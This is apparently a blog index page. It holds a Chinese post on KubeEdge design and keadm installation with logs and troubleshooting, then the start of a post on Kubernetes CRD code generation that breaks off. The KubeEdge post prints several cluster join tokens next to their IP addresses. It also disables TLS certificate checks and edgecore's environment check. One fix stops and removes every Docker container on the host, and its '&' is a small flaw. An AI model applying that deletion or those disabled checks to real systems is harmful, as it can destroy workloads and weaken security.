/apis/reliablesyncs.kubeedge.io/v1alpha1/namespaces/default/objectsyncs/node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 UID: c329514a-784c-4fdf-9261-53bf4dcc18a0 Spec: Object API Version: v1 Object Kind: pods Object Name: testpod Status: Object Resource Version: 34833729 Events: \u0026lt;none\u0026gt; (base) [root@node1 ~]#   Exception scenarios/Corner cases handling CloudCore重启  当Cloudcore正常重新启动或启动时，它将检查ResourceVersion以避免发送旧消息。 在Cloudcore重新启动期间，如果删除某些对象，此时可能会丢失DELETE事件。SyncController将处理此情况。这里需要对象GC机制来确保删除：比较CRD中存储的对象是否存在于K8s中。如果没有，则SyncController将生成并发送一个DELETE事件到边缘，并在ACK接收到时删除CRD中的对象。  EdgeCore 重启  当EdgeCore重新启动或脱机一段时间后，节点消息队列将缓存所有消息，每当该节点恢复联机时，消息将被发送。 当边缘节点脱机时，CloudHub将停止发送消息，直到边缘节点恢复联机才会重试。  EdgeNode 删除  当从云中删除edgenode时，Cloudcore将删除相应的消息队列和存储  ObjectSync CR 垃圾回收 当EdgeNode不在集群中时，应删除EdgeNode的所有ObjectSync CRS。\n现在，触发垃圾收集的主要方法有两种：CloudCore的启动和EdgeNode的删除事件。\n 当CloudCore启动时，它将首先检查是否存在旧的ObjectSync CRS并删除它们。 当CloudCore运行时，EdgeNode被删除的事件将触发垃圾回收。  部署安装 Deploying using Keadm\nDownload keadm 下载页面，选择相应版本keadm\nkubeedge下载链接\n1  kubeedge/keadm-v1.6.2-linux-amd64/keadm/keadm   keadm用法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  # ./keadm -h +----------------------------------------------------------+ | KEADM | | Easily bootstrap a KubeEdge cluster | | | | Please give us feedback at: | | https://github.com/kubeedge/kubeedge/issues | +----------------------------------------------------------+ Create a cluster with cloud node (which controls the edge node cluster), and edge nodes (where native containerized application, in the form of pods and deployments run), connects to devices. Usage: keadm [command] Examples: +----------------------------------------------------------+ | On the cloud machine: | +----------------------------------------------------------+ | master node (on the cloud)# sudo keadm init | +----------------------------------------------------------+ +----------------------------------------------------------+ | On the edge machine: | +----------------------------------------------------------+ | worker node (at the edge)# sudo keadm join \u0026lt;flags\u0026gt; | +----------------------------------------------------------+ You can then repeat the second step on, as many other machines as you like. Available Commands: debug debug function to help diagnose the cluster gettoken To get the token for edge nodes to join the cluster help Help about any command init Bootstraps cloud component. Checks and install (if required) the pre-requisites. join Bootstraps edge component. Checks and install (if required) the pre-requisites. Execute it on any edge node machine you wish to join reset Teardowns KubeEdge (cloud \u0026amp; edge) component version Print the version of keadm Flags: -h, --help help for keadm Use \u0026#34;keadm [command] --help\u0026#34; for more information about a command.   Setup Cloud Side (KubeEdge Master Node) By default ports 10000 and 10002 in your cloudcore needs to be accessible for your edge nodes.\nkeadm init will install cloudcore, generate the certs and install the CRDs. It also provides a flag by which a specific version can be set.\n在master节点上执行：\n 采用默认版本参数  1 2 3  # keadm init --advertise-address=\u0026#34;THE-EXPOSED-IP\u0026#34;(only work since 1.3 release) keadm init --advertise-address=\u0026#34;10.7.11.213\u0026#34;   或者指定版本  1  keadm init --advertise-address=\u0026#34;10.7.11.212\u0026#34; --kubeedge-version=1.6.2 --kube-config=/root/.kube/config   Output:\n1 2 3  Kubernetes version verification passed, KubeEdge installation will start... ... KubeEdge cloudcore is running, For logs visit: /var/log/kubeedge/cloudcore.log   安装打印 指定版本kubeedge-v1.6.2，下载成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm init --advertise-address=\u0026#34;10.7.11.213\u0026#34; --kubeedge-version=1.6.2 --kube-config=/root/.kube/config Kubernetes version verification passed, KubeEdge installation will start... Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: kubeedge-v1.6.2-linux-amd64.tar.gz in your path checksum failed and do you want to delete this file and try to download again? [y/N]: y I0524 17:09:26.209161 8227 common.go:271] kubeedge-v1.6.2-linux-amd64.tar.gz have been deleted and will try to download again kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: [Run as service] service file already exisits in /etc/kubeedge//cloudcore.service, skip download kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge cloudcore is running, For logs visit: /var/log/kubeedge/cloudcore.log CloudCore started (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ps -ef |grep -i cloudcore root 25669 1 0 17:13 pts/11 00:00:00 /usr/local/bin/cloudcore root 30844 94002 0 17:16 pts/11 00:00:00 grep --color=auto -i cloudcore (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]#   cloudcore启动日志 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ]# cat /var/log/kubeedge/cloudcore.log I0525 10:56:45.064260 34285 server.go:64] Version: v1.6.2 I0525 10:56:45.066622 34285 module.go:34] Module cloudhub registered successfully I0525 10:56:45.083709 34285 module.go:34] Module edgecontroller registered successfully I0525 10:56:45.083792 34285 module.go:34] Module devicecontroller registered successfully I0525 10:56:45.083826 34285 module.go:34] Module synccontroller registered successfully W0525 10:56:45.083850 34285 module.go:37] Module cloudStream is disabled, do not register W0525 10:56:45.083856 34285 module.go:37] Module router is disabled, do not register W0525 10:56:45.083865 34285 module.go:37] Module dynamiccontroller is disabled, do not register I0525 10:56:45.083919 34285 core.go:24] Starting module cloudhub I0525 10:56:45.083946 34285 core.go:24] Starting module edgecontroller I0525 10:56:45.083975 34285 core.go:24] Starting module devicecontroller I0525 10:56:45.084029 34285 core.go:24] Starting module synccontroller I0525 10:56:45.084033 34285 upstream.go:110] start upstream controller I0525 10:56:45.084694 34285 downstream.go:870] Start downstream devicecontroller I0525 10:56:45.086932 34285 downstream.go:550] start downstream controller I0525 10:56:45.184174 34285 server.go:269] Ca and CaKey don\u0026#39;t exist in local directory, and will read from the secret I0525 10:56:45.186205 34285 server.go:273] Ca and CaKey don\u0026#39;t exist in the secret, and will be created by CloudCore I0525 10:56:45.203712 34285 server.go:317] CloudCoreCert and key don\u0026#39;t exist in local directory, and will read from the secret I0525 10:56:45.209247 34285 server.go:321] CloudCoreCert and key don\u0026#39;t exist in the secret, and will be signed by CA I0525 10:56:45.224935 34285 signcerts.go:98] Succeed to creating token I0525 10:56:45.225003 34285 server.go:44] start unix domain socket server I0525 10:56:45.225475 34285 server.go:63] Starting cloudhub websocket server I0525 10:56:45.225681 34285 uds.go:72] listening on: //var/lib/kubeedge/kubeedge.sock I0525 10:56:47.085035 34285 upstream.go:63] Start upstream devicecontroller   Setup Edge Side (KubeEdge Worker Node) Get Token From Cloud Side Run keadm gettoken in cloud side will return the token, which will be used when joining edge nodes. 在cloud节点生成token，并记录，后面edge节点用到\n1 2 3 4 5 6 7  #./keadm gettoken # 59886279cecd7da202f1d258aad523cf44df78afac68a2766546d97a5ca5e6f9.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5OTc4MDV9._XjeO1GW7gsqfwM4AZ0VuOTIW1FWNAkjOTlirBByV3g keadm gettoken # 27a37ef16159f7d3be8fae95d588b79b3adaaf92727b72659eb89758c66ffda2.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1OTAyMTYwNzd9.JBj8LLYWXwbbvHKffJBpPd5CyxqapRQYDIXtFZErgYE   Join Edge Node keadm join will install edgecore and mqtt. It also provides a flag by which a specific version can be set.\nExample:\n1 2  # keadm join --cloudcore-ipport=192.168.20.50:10000 --token=27a37ef16159f7d3be8fae95d588b79b3adaaf92727b72659eb89758c66ffda2.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1OTAyMTYwNzd9.JBj8LLYWXwbbvHKffJBpPd5CyxqapRQYDIXtFZErgYE # IMPORTANT NOTE: 1. --cloudcore-ipport flag is a mandatory flag. 1. If you want to apply certificate for edge node automatically, --token is needed. 1. The kubeEdge version used in cloud and edge side should be same.   1 2 3 4  keadm join --cloudcore-ipport=10.7.11.212:10000 --kubeedge-version=1.6.2 --token=59886279cecd7da202f1d258aad523cf44df78afac68a2766546d97a5ca5e6f9.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5OTc4MDV9._XjeO1GW7gsqfwM4AZ0VuOTIW1FWNAkjOTlirBByV3g   Output:\n1 2 3  Host has mosquit+ already installed and running. Hence skipping the installation steps !!! ... KubeEdge edgecore is running, For logs visit: /var/log/kubeedge/edgecore.log   安装过程部分打印 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm gettoken 9ecb7342293641c71fe70ac296e349bf0fce395618cb66c27e0643c3b8c985b5.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5MzQwMzh9.5b8f16RDwRhCnnebz_3oc4yn3CnfXLz3kMl7-tPoRD0 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm join --cloudcore-ipport=10.7.11.213:10000 --token=9ecb7342293641c71fe70ac296e349bf0fce395618cb66c27e0643c3b8c985b5.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5MzQwMzh9.5b8f16RDwRhCnnebz_3oc4yn3CnfXLz3kMl7-tPoRD0 install MQTT service successfully. Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: kubeedge-v1.6.2-linux-amd64.tar.gz in your path checksum failed and do you want to delete this file and try to download again? [y/N]: N W0524 17:35:22.099204 64615 common.go:276] failed to checksum and will continue to install. [Run as service] start to download service file for edgecore [Run as service] success to download service file for edgecore kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge edgecore is running, For logs visit: journalctl -u edgecore.service -b (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# # edgecore.service的下载和加载目录位置 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# find / -name edgecore.service /etc/systemd/system/multi-user.target.wants/edgecore.service /etc/systemd/system/edgecore.service /etc/kubeedge/edgecore.service (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]#   节点信息 node2是新加入集群的edge节点\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  # kubectl get no NAME STATUS ROLES AGE VERSION node1 Ready master 249d v0.0.0-master+4d3c9e0c node2 Ready agent,edge 2m5s v1.19.3-kubeedge-v1.6.2 Name: node2 Roles: agent,edge Labels: kubernetes.io/arch=amd64 kubernetes.io/hostname=node2 kubernetes.io/os=linux node-role.kubernetes.io/agent= node-role.kubernetes.io/edge= Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Tue, 25 May 2021 12:41:04 +0800 Taints: \u0026lt;none\u0026gt; Unschedulable: false Lease: HolderIdentity: \u0026lt;unset\u0026gt; AcquireTime: \u0026lt;unset\u0026gt; RenewTime: \u0026lt;unset\u0026gt; Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- Ready True Tue, 25 May 2021 14:00:19 +0800 Tue, 25 May 2021 14:00:19 +0800 EdgeReady edge is posting ready status Addresses: InternalIP: 10.7.11.213 Hostname: node2 Capacity: cpu: 32 memory: 31650Mi pods: 110 Allocatable: cpu: 32 memory: 31550Mi pods: 110 System Info: Machine ID: System UUID: Boot ID: Kernel Version: 3.10.0-1062.12.1.el7.x86_64 OS Image: CentOS Linux 7 (Core) Operating System: linux Architecture: amd64 Container Runtime Version: docker://19.3.13 Kubelet Version: v1.19.3-kubeedge-v1.6.2 Kube-Proxy Version: PodCIDR: 10.233.65.0/24 PodCIDRs: 10.233.65.0/24 Non-terminated Pods: (3 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits AGE --------- ---- ------------ ---------- --------------- ------------- --- default testpod 500m (1%) 500m (1%) 0 (0%) 0 (0%) 50s kube-system calico-node-df9bf 150m (0%) 300m (0%) 64M (0%) 500M (1%) 71m kube-system nodelocaldns-ldj7t 100m (0%) 0 (0%) 70Mi (0%) 170Mi (0%) 71m Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) Resource Requests Limits -------- -------- ------ cpu 750m (2%) 800m (2%) memory 137400320 (0%) 678257920 (2%) ephemeral-storage 0 (0%) 0 (0%) Events: \u0026lt;none\u0026gt;   组件进程 1 2 3 4 5 6 7 8 9 10  root 74050 13.9 0.2 3499776 84608 ? Ssl 18:17 1:04 /usr/local/bin/edgecore root 25669 0.3 0.1 2435444 56532 pts/11 Sl 17:13 0:14 /usr/local/bin/cloudcore # 在edge node上 还运行了mosquitto # ps -ef |grep mosquitto mosquit+ 72032 1 0 May24 ? 00:00:20 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf ## 服务 /usr/lib/systemd/system/mosquitto.service   卸载 1 2 3 4 5  keadm reset # mosquitto 是rpm 通过yum安装和删除 yum -y remove mosquitto   会停止服务，删除程序和配置目录文件/etc/kubeedge\n1 2 3 4 5 6 7  # ./keadm reset [reset] WARNING: Changes made to this host by \u0026#39;keadm init\u0026#39; or \u0026#39;keadm join\u0026#39; will be reverted. [reset] Are you sure you want to proceed? [y/N]: y edgecore is stopped   问题 keadm在线下载失败 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  (base) [/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm init --advertise-address=\u0026#34;10.7.11.213\u0026#34; --kubeedge-version=1.6.2 --kube-config=/root/.kube/configKubernetes version verification passed, KubeEdge installation will start...Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it.kubeedge-v1.6.2-linux-amd64.tar.gz checksum:checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content:Expected or Default KubeEdge version 1.6.2 is already downloaded[Run as service] start to download service file for cloudcoreError:fail to download service file,error:{failed to exec \u0026#39;bash -c cd /etc/kubeedge/ \u0026amp;\u0026amp; sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service\u0026#39;, err: --2021-05-24 16:45:02-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.Unable to establish SSL connection.Converted 0 files in 0 seconds., err:exit status 4}Usage:keadm init [flags]Examples:keadm init- This command will download and install the default version of KubeEdge cloud componentkeadm init --kubeedge-version=1.5.0 --kube-config=/root/.kube/config- kube-config is the absolute path of kubeconfig which used to secure connectivity between cloudcore and kube-apiserverFlags:--advertise-address string Use this key to set IPs in cloudcore\u0026#39;s certificate SubAltNames field. eg:10.10.102.78,10.10.102.79--domainname string Use this key to set domain names in cloudcore\u0026#39;s certificate SubAltNames field. eg:www.cloudcore.cn,www.kubeedge.cn-h, --help help for init--kube-config string Use this key to set kube-config path, eg:$HOME/.kube/config (default \u0026#34;/root/.kube/config\u0026#34;)--kubeedge-version string Use this key to download and use the required KubeEdge version--master string Use this key to set K8s master address, eg:http://127.0.0.1:8080--tarballpath string Use this key to set the temp directory path for KubeEdge tarball, if not exist, download itF0524 16:46:02.638767 68936 keadm.go:27] fail to download service file,error:{failed to exec \u0026#39;bash -c cd /etc/kubeedge/ \u0026amp;\u0026amp; sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service\u0026#39;, err: --2021-05-24 16:45:02-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.Unable to establish SSL connection.Converted 0 files in 0 seconds.  进入默认下载目录/etc/kubeedge下， 采用手动方式下载cloudcore.service文件，解决\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  (base) [root@node2 /tmp]#(base) [root@node2 /tmp]# cd /etc/kubeedge/(base) [root@node2 /etc/kubeedge]# lltotal 49200drwxr-xr-x. 5 root root 72 May 24 16:13 crds-rw-r--r--. 1 root root 50379289 Mar 22 10:07 kubeedge-v1.6.2-linux-amd64.tar.gz(base) [root@node2 /etc/kubeedge]# sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service--2021-05-24 17:05:11-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength:162[text/plain]Saving to:‘cloudcore.service’100%[=========================================================================================================================\u0026gt;] 162 --.-K/s in 0s2021-05-24 17:05:11(3.17 MB/s) - ‘cloudcore.service’ saved [162/162]Converted 0 files in 0 seconds.(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]# lltotal 49204-rw-r--r--. 1 root root 162 May 24 17:05 cloudcore.servicedrwxr-xr-x. 5 root root 72 May 24 16:13 crds-rw-r--r--. 1 root root 50379289 Mar 22 10:07 kubeedge-v1.6.2-linux-amd64.tar.gz(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]# cat cloudcore.service[Unit]Description=cloudcore.service[Service]Type=simpleExecStart=/usr/local/bin/cloudcoreRestart=alwaysRestartSec=10[Install]WantedBy=multi-user.target(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#(base) [root@node2 /etc/kubeedge]#  edgecore失败-Failed to check the running environment edgecore 进行运行环境检查，Kubelet 不能运行在edge\n1 2 3 4 5 6 7 8  ay 24 17:39:59 node2 edgecore[89260]: INFO: Install client plugin, protocol: rest May 24 17:39:59 node2 edgecore[89260]: INFO: Installed service discovery plugin: edge May 24 17:39:59 node2 edgecore[89260]: I0524 17:39:59.286453 89260 server.go:72] Version: v1.6.2 May 24 17:39:59 node2 edgecore[89260]: F0524 17:39:59.321896 89260 server.go:79] Failed to check the running environment: Kubelet should not running on edge May 24 17:39:59 node2 edgecore[89260]: goroutine 1 [running]: May 24 17:39:59 node2 edgecore[89260]: k8s.io/klog/v2.stacks(0xc000128001, 0xc0003622d0, 0x93, 0xe6)   可以通过设置环境变量 CHECK_EDGECORE_ENVIRONMENT=false，使得edgecore不做运行环境检查\n1  vi /etc/systemd/system/edgecore.service   /etc/systemd/system/edgecore.service\n1 2 3 4 5 6 7 8 9 10 11 12 13  [Unit]Description=edgecore.service[Service]Type=simpleExecStart=/usr/local/bin/edgecoreEnvironment=\u0026#34;CHECK_EDGECORE_ENVIRONMENT=false\u0026#34;Restart=alwaysRestartSec=10[Install]WantedBy=multi-user.target  1 2  systemctl daemon-reload systemctl restart edgecore   edgecore失败-Failed to start container manager 1 2 3 4 5 6 7 8 9 10 11  May 25 12:16:05 node2 edgecore: W0525 12:16:05.217771 103976 proxy.go:64] [EdgeMesh] add route err: file exists May 25 12:16:05 node2 edgecore: I0525 12:16:05.254379 103976 client.go:86] parsed scheme: \u0026#34;unix\u0026#34; May 25 12:16:05 node2 edgecore: I0525 12:16:05.254423 103976 client.go:86] scheme \u0026#34;unix\u0026#34; not registered, fallback to default scheme May 25 12:16:05 node2 edgecore: I0525 12:16:05.254470 103976 passthrough.go:48] ccResolverWrapper: sending update to cc: {[{unix:///run/containerd/containerd.sock \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}] \u0026lt;nil\u0026gt; \u0026lt;nil\u0026gt;} May 25 12:16:05 node2 edgecore: I0525 12:16:05.254496 103976 clientconn.go:948] ClientConn switching balancer to \u0026#34;pick_first\u0026#34; May 25 12:16:06 node2 edgecore: E0525 12:16:06.238991 103976 edged.go:742] Failed to start container manager, err: failed to build map of initial containers from runtime: no PodsandBox found with Id \u0026#39;acb4ba296812113c10acd0d7ea1f048328950ff77d36be515b3e15ba3d67ba72\u0026#39; May 25 12:16:06 node2 edgecore: E0525 12:16:06.239012 103976 edged.go:293] initialize module error: failed to build map of initial containers from runtime: no PodsandBox found with Id \u0026#39;acb4ba296812113c10acd0d7ea1f048328950ff77d36be515b3e15ba3d67ba72\u0026#39; May 25 12:16:06 node2 systemd: edgecore.service: main process exited, code=exited, status=1/FAILURE May 25 12:16:06 node2 systemd: Unit edgecore.service entered failed state. May 25 12:16:06 node2 systemd: edgecore.service failed.    检查edgecore的配置文件的edgecore.yaml的参数podSandboxImage 是否正确  1 2  podSandboxImage:kubeedge/pause:3.1  清理掉环境中已有pod的容器  1 2 3  # 停用并删除全部容器 docker stop $(docker ps -q) \u0026amp; docker rm $(docker ps -aq)   参考资料  kubeedge-k8s-based-edge-intro kubeedge Documentation kubeedge SourceCode Kubernetes：在边缘计算领域的发展和KubeEdge介绍 kubeedge实现原理  ","permalink":"http://bingerambo.com/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/","tags":["K8S"],"title":"KubeEdge介绍和设计原理"},{"categories":["K8S"],"contents":"介绍K8S使用CRD进行开发的操作步骤。\nCRD中的generate-client-codes 在使用CustomResources时通常会使用以下几个code-generators:\n deepcopy-gen—creates a method func (t* T) DeepCopy() *T for each type T client-gen—creates typed clientsets for CustomResource APIGroups informer-gen—creates informers for CustomResources which offer an event based interface to react on changes of CustomResources on the server lister-gen—creates listers for CustomResources which offer a read-only caching layer for GET and LIST requests.  代码生成器codegen 所有Kubernetes代码生成器都是在k8s.io/gengo之上实现的。它们共享许多公共命令行flag。基本上，所有的生成器都会得到一个输入包的列表(\u0026ndash;input-dis)，它们逐个type遍历这些包，并输出生成的代码。\n关于生成的代码：\n  或者转到与输入文件相同的目录中，比如inepCopy-gen(带有\u0026ndash;输出文件基“zz_generated.deepcopy”来定义文件名)。\n  或者，它们生成一个或多个输出包(带有\u0026ndash;output-package)，比如client-, informer- and lister-gen (通常生成在pkg/client目录下)。\n  k8s.io/code-generator提供了一个shell脚本generator-group.sh，用于调用生成器及其对CustomResources用例的所有特殊的小需求。在自己的项目中要做的全部工作归结为一个一行程序脚本命令，具体执行代码通常位于hack/update-codegen.sh内。\n1 2 3 4 5  vendor/k8s.io/code-generator/generate-groups.sh all \\ github.com/xxx_project/crd-code-generation/pkg/client \\ github.com/xxx_project/crd-code-generation/pkg/apis \\ example.com:v1   所有的API都在pkg/api下面，clientsets, informers, and listers都是在pkg/client内部创建的。也就是说，pkg/client是完全自动生成的，与包含CustomResourcegolang类型的Typees.go文件旁边的ZZ_generated.deepcopy.go文件一样，都是完全生成的。这两者都不应该手动修改，而是通过运行\n1 2 3 4 5  hack/update-codegen.sh # 或者 hack/update-gencode.sh   通常，在update-codegen.sh文件旁边还有一个hack/version-codegen.sh或hack/verify-gencode.sh脚本，如果生成的任何文件都不是最新的，它将以非零返回代码终止。这在CI脚本中非常有用：如果开发人员意外地修改了文件，或者文件只是过时了，CI会注意到并提示。\n控制自动生成代码标记-Tags 虽然代码生成器的某些行为是通过上面描述的命令行标志(特别是要处理的包)来控制的，但是更多的属性是通过您的golang文件中的tag标记来控制的。\n有2种类型tag\n Global tags above package in doc.go Local tags above a type that is processed  通常，标记的形状为//+标记名称或//+标记名称=值，也就是说，它们被写入注释中。根据标签的不同，注释的位置可能很重要。有许多标记必须位于类型(或全局标记的包行)上方的注释中，其他标记必须与类型(Pr包行)分隔，中间至少有一行空行。最好遵循一个例子，并复制基本的形状。\n全局标记-GLOBAL TAGS 全局标记在pkg/apis///doc.go中定义，如下\npkg/apis/example.com/v1/doc.go\n1 2 3 4 5 6  // +k8s:deepcopy-gen=package,register  // Package v1 is the v1 version of the API. // +groupName=example.com package v1   默认情况下，它告诉DeepCopy-gen为该包中的每一种类型创建深度复制方法。如果您的类型不是必需的或不需要的，则可以使用本地标记//+k8s选择退出这样的类型：// +k8s:deepcopy-gen=false。如果不启用包范围的深度复制，则必须选择通过//+k8s对每种所需类型进行深度复制：// +k8s:deepcopy-gen=true。\n最后，//+groupName=example.com定义了完全限定的API组名。如果搞错了，客户端会产生错误的代码。请注意，此标记必须位于包上方的注释块中。\n本地标记-LOCAL TAGS 本地标记可以直接写在API type上，也可以写在它上面的第二个注释块中。下面是一个示例 types.go。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  // +genclient  // +genclient:noStatus  // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // Database describes a database.  type Database struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Spec DatabaseSpec `json:\u0026#34;spec\u0026#34;` } // DatabaseSpec is the spec for a Foo resource  type DatabaseSpec struct { User string `json:\u0026#34;user\u0026#34;` Password string `json:\u0026#34;password\u0026#34;` Encoding string `json:\u0026#34;encoding,omitempty\u0026#34;` } // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  // DatabaseList is a list of Database resources  type DatabaseList struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ListMeta `json:\u0026#34;metadata\u0026#34;` Items []Database `json:\u0026#34;items\u0026#34;` }   注意，默认情况下，我们已为所有类型启用了deepcopy ，也可有选择退出。不过，这些类型都是API类型，需要deepcopy。因此，我们不必在本例 types.go中打开或关闭deepcopy，而只需在doc.go中的包范围内打开或关闭deepcopy。\nruntime.Object and DeepCopyObject 有一个特殊的deepcopy tag说明\n1 2  // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  需要为type添加这个tag 原因如下： k8s.op/apimachinery of the master branch—you have hit the compiler error that the CustomResource type does not implement runtime.Object because DeepCopyObject() runtime.Object is not defined on your type\n解决方法：只需将以下本地标记置于顶级api类型之上\n1 2 3  // 